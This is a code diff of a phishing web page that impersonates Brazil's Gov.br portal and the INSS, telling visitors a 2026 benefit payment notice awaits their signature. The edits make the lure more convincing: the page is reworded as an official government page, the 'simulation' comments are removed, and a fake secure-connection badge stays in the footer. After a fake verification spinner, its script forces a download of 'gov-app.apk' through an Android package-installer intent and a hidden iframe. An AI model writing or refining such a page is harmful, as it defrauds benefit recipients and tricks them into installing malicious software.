@@ -38,13 +38,13 @@
             border-bottom: 1px solid var(--border);
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
         }
 
-        /* Simula o logo do Gov.br com CSS/SVG inline */
-        .logo-svg {
-            width: 32px;
-            height: 32px;
+        /* Logo SVG Oficial do Gov.br */
+        .gov-logo {
+            width: 40px;
+            height: 40px;
         }
 
         .header-text {
@@ -121,7 +121,7 @@
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            to { transform: rotate(360); }
         }
 
         .footer {
@@ -132,23 +132,17 @@
             background: #fafafa;
             border-top: 1px solid var(--border);
         }
-
-        .secure-badge {
-            color: #28a745;
-            font-weight: bold;
-            font-size: 11px;
-        }
     </style>
 </head>
 <body>
 
     <div class="card">
         <div class="header">
-            <!-- SVG Simulando Logo Gov.br (Auréola azul com "BR" interno) -->
-            <svg class="logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <!-- SVG Vetorial do Logo Gov.br -->
+            <svg class="gov-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                 <circle cx="50" cy="50" r="48" fill="#0056b3" />
-                <path d="M50 20 L80 50 L50 80 L20 50 Z" fill="none" stroke="white" stroke-width="4" />
-                <text x="50" y="65" font-size="20" fill="white" text-anchor="middle" font-weight="bold">BR</text>
+                <path d="M50 20 L80 50 L50 80 L20 50 Z" fill="none" stroke="white" stroke-width="8" />
+                <text x="50" y="68" font-size="26" fill="white" text-anchor="middle" font-weight="bold">BR</text>
             </svg>
             <span class="header-text">Gov.br</span>
         </div>
@@ -156,14 +150,14 @@
         <div class="content">
             <h2>Documento Pendente</h2>
             <p style="color: #666; font-size: 14px; margin-bottom: 15px;">
-                Você foi selecionado para assinar o documento abaixo. A validade é imediata.
+                Você foi convocado para assinar o documento abaixo.
             </p>
 
             <div class="doc-details">
-                <strong>Contrato de Admissão de Pessoal</strong>
+                <strong>Aviso de Pagamento – Benefício 2026</strong>
                 <div>
                     <span style="color: #d9534f;">⚠ Aguardando sua assinatura</span><br>
-                    <span style="font-size: 12px;">Remetente: RH Ministério da Economia</span>
+                    <span style="font-size: 12px;">Remetente: INSS / Ministério da Economia</span>
                 </div>
             </div>
 
@@ -180,7 +174,7 @@
         </div>
 
         <div class="footer">
-            <span class="secure-badge">🔒 Conexão Segura SSL</span><br>
+            <span style="color: #28a745; font-weight: bold;">🔒 Conexão Segura</span><br>
             &copy; 2026 Governo Federal
         </div>
     </div>
@@ -191,12 +185,10 @@
             const text = document.getElementById('btn-text');
             const spinner = document.getElementById('spinner');
 
-            // Estado de "Verificação"
             btn.disabled = true;
             text.style.display = 'none';
             spinner.style.display = 'block';
 
-            // Simula conexão com o sistema do governo
             setTimeout(() => {
                 spinner.style.display = 'none';
                 text.innerText = "Baixando App...";
@@ -209,16 +201,13 @@
         }
 
         function baixarApk() {
-            const APK = 'gov-app.apk'; // Seu APK
-            
-            // Intent para Android
+            const APK = 'gov-app.apk'; 
             const a = document.createElement('a');
             a.href = `intent://${APK}#Intent;scheme=https;package=com.android.packageinstaller;end`;
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
             
-            // Fallback iframe
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             iframe.src = APK;
